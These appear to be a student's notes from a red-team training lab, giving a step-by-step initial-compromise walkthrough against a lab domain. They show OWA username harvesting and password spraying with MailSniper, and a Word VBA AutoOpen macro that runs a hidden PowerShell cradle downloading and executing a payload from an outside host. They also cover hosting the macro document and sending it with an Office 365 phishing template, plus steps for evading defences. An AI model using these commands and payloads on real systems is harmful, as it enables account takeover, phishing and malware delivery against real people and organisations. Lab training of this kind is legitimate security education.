# Initial Compromise

Attack the OWA Exchange service at mail.cyberbotic.io.

## Password Spraying

Tools for password spraying against Office 365 and Exchange:
* [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)
* [MailSniper](https://github.com/dafthack/MailSniper)
* [namemash](https://gist.github.com/superkojiman/11076951)

On Attacker Desktop:
  1. Disable Defender's Real-time protection
  2. Download [MailSniper](https://github.com/dafthack/MailSniper/blob/master/MailSniper.ps1)
  3. In an Admin PS, run ```Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine```
  4. In a standard PS, import MailSniper: ```ipmo .\MailSniper.ps1```
  5. ```Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io```  // gives NetBIOS name of domain
  6. Generate possible usernames from names at [https://www.cyberbotic.io/our-team](https://www.cyberbotic.io/our-team):
    5. ```cd /mnt/c/Users/Attacker/Desktop/```
    6. ```cat names.txt```:
        * Bob Farmer
        * Isabel Yates
        * John King
        * Joyce Adams
    8. Use [namemash](https://gist.github.com/superkojiman/11076951) to generate usernames (if format isn't already known): ```python ./namemash.py names.txt > possible.txt```
  9. ```Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList possible.txt -OutFile valid.txt```  // validates usernames using timing attack
  10. Use [MailSniper](https://github.com/dafthack/MailSniper) to spray passwords against valid accounts (beware of login lockouts!):
  11. ```Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList valid.txt -Password Summer2022```


## Internal Phishing
With the credentials of a legit internal user, many doors open, e.g.:
* Emails that may contain sensitive information such as documents, usernames, and passwords
* Send internal emails on behalf of the user, containing specially crafted files/links, or even download a document already in an inbox, backdoor it (e.g. with a macro) and send it back to somebody

## Initial Access Payloads
Two options for delivering a payload that will execute on their system:

1. Send a URL from which a payload can download
2. Attach a payload to the phishing email

## Initial Access Payloads

Files emailed "internally" from a compromised Exchange mailbox are not tagged with a Zone Identifier, and won't have the "mark of the web" (MotW) and come under greater scrutiny.

Check to see whether a file has the MotW: ```gc .\test.txt -Stream Zone.Identifier```. The zones ```gc``` reports are: 

  0: Local computer
  1: Local intranet
  2: Trusted sites
  3: Internet
  4: Restricted sites

## Visual Basic for Applications (VBA) Macros

Docs containing macros are handled with more scrutiny. Create a macro in a Word document by:

1. In CS: Attacks > Scripted Web Delivery (S)
2. Make a 64-bit PowerShell payload for your HTTP listener
  3. URI: anything
  4. Local host: nickelviper.com
  5. Local port: 80
  6. Listener: http
  7. Type: powershell
  8. Use x64 payload
9. This creates a payload hosted on the team server so it can be downloaded over HTTP and executed in-memory; paste into a Word macro (below): ```Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""```
1. In Word: View > Macros > Create
2. Change the "Macros in" field to the document name
3. Basic macro:
    ```
    Sub AutoOpen()
    
      Dim Shell As Object
      Set Shell = CreateObject("wscript.shell")
      Shell.Run "<command>"
    
    End Sub
    ```
4. If the Office license doesn't allow macros, run a Command Prompt as admin:
    ```
    cd C:\Program Files\Microsoft Office\Office16
    cscript ospp.vbs /rearm
    ```
5. In Word: File > Info > Inspect Document > Inspect Document, click Inspect then Remove All next to Document Properties and Personal Information
6. File > Save As and save to C:\Payloads. Any filename, and Save as type: Word 97-2003 (.doc) (.docm usually gets flagged/blocked)
7. Host the file: in CS: Site Management > Host File
  1. File: <payload .doc file>
  2. Local URI: /<file>
  3. Local host: nickelviper.com // an appropriate looking URL you control or a hosting service like OneDrive would be more legit
  4. Local port: 80
  5. Mime type: automatic
8. Open an HTML email template for Office 365 in a browser from https://github.com/ZeroPointSecurity/PhishingTemplates/tree/master/Office365
9. Copy the content and paste into the OWA text editor
10. Change text/URL as appropriate, e.g. http://nickelviper.com/file.doc
  
  
  

     

